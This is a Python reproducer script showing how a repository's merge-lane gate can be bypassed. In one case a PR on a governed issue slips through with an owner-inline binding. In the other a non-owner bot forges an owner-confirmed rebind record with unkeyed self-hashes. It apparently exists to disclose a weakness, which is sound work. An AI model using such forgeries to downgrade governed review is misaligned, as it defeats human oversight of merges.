"""Reproducer: trusted_merge_lane_gate accepts a silent GOVERNED->DIRECT downgrade.

Case A (OWNER_INLINE escape): the base revision holds a tracked Task Card that
declares `execution_lane: GOVERNED` for Issue #900. A PR that closes #900 simply
declares an OWNER_INLINE DIRECT binding (no task card fields). The gate never
looks for the governed card bound to the Issue/PR, so it PASSes.

Case B (forged Owner rebind): a non-Owner PR author (event.sender = worker-bot)
fabricates `nexus.owner_execution_lane_rebind.v1` with owner_confirmation=true.
record_hash / binding_hash are unkeyed sha256 self-hashes, owner_id is only
string-compared to the repository owner, and event.sender is never consulted,
so the gate PASSes "OWNER_GOVERNED_TO_DIRECT_REBIND_VALID".
"""
import hashlib
import json
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, "/home/user/Nexus-new")
from scripts.ops.trusted_merge_lane_gate import (  # noqa: E402
    BINDING_SCHEMA, REBIND_SCHEMA, canonical_hash, render_binding, render_intent, validate_event,
)

REPO = "James3014/Nexus-new"
CARD = "tasks/governed-900/00-fix.md"


def git(repo, *a):
    return subprocess.check_output(["git", "-C", str(repo), *a], text=True).strip()


def make_repo(tmp: Path):
    repo = tmp / "r"
    repo.mkdir()
    subprocess.run(["git", "-C", str(repo), "init", "-q", "-b", "main"], check=True)
    git(repo, "config", "user.name", "t"); git(repo, "config", "user.email", "t@x.invalid")
    (repo / CARD).parent.mkdir(parents=True)
    (repo / CARD).write_text("# Task Card\n\ntask_id: `issue-900`\nattempt_id: `attempt-1`\n"
                             "execution_lane: GOVERNED\n", encoding="utf-8")
    (repo / "a.txt").write_text("base\n")
    git(repo, "add", "."); git(repo, "commit", "-q", "-m", "base")
    base = git(repo, "rev-parse", "HEAD")
    (repo / "a.txt").write_text("head\n")
    git(repo, "add", "."); git(repo, "commit", "-q", "-m", "worker change")
    return repo, base, git(repo, "rev-parse", "HEAD")


def sign(d, field):
    d = dict(d); d.pop(field, None); d[field] = canonical_hash(d); return d


def event(base, head, body, sender="worker-bot"):
    return {"event_name": "pull_request_target", "repository": {"full_name": REPO},
            "sender": {"login": sender},
            "pull_request": {"number": 2000, "title": "Fix governed issue", "body": body,
                             "user": {"login": sender}, "commit_message": "",
                             "base": {"sha": base}, "head": {"sha": head}}}


with tempfile.TemporaryDirectory() as t:
    repo, base, head = make_repo(Path(t))

    # Case A: OWNER_INLINE DIRECT binding on a PR closing governed Issue #900
    bind_a = sign({"schema": BINDING_SCHEMA, "execution_lane": "DIRECT_CANONICAL",
                   "contract_kind": "OWNER_INLINE", "owner_id": "James3014",
                   "issue_number": None, "task_id": None, "attempt_id": None,
                   "task_card_path": None, "task_card_sha256": None,
                   "owner_lane_rebind": None}, "binding_hash")
    body_a = ("Closes #900\n" + render_intent({"issue": 900, "on_merge": "CLOSE"}) + "\n"
              + render_binding(bind_a))
    r = validate_event(event(base, head, body_a), repo_root=repo)
    print("CASE_A governed-card issue via OWNER_INLINE:", r["status"], r["reason"], r["execution_lane"])

    # Case B: forged Owner rebind authored by a non-owner sender
    card_sha = hashlib.sha256((repo / CARD).read_bytes()).hexdigest()
    rebind = sign({"schema": REBIND_SCHEMA, "repository": REPO, "issue_number": 900,
                   "task_id": "issue-900", "attempt_id": "attempt-1", "task_card_path": CARD,
                   "task_card_sha256": card_sha, "pull_request_number": 2000,
                   "expected_pr_head_sha": head, "from_lane": "GOVERNED",
                   "to_lane": "DIRECT_DELEGATED", "owner_id": "James3014",
                   "owner_confirmation": True}, "record_hash")
    bind_b = sign({"schema": BINDING_SCHEMA, "execution_lane": "DIRECT_DELEGATED",
                   "contract_kind": "TRACKED_TASK_CARD", "owner_id": "James3014",
                   "issue_number": 900, "task_id": "issue-900", "attempt_id": "attempt-1",
                   "task_card_path": CARD, "task_card_sha256": card_sha,
                   "owner_lane_rebind": rebind}, "binding_hash")
    r = validate_event(event(base, head, render_binding(bind_b), sender="worker-bot"), repo_root=repo)
    print("CASE_B forged rebind by sender=worker-bot:", r["status"], r["reason"], r["execution_lane"])
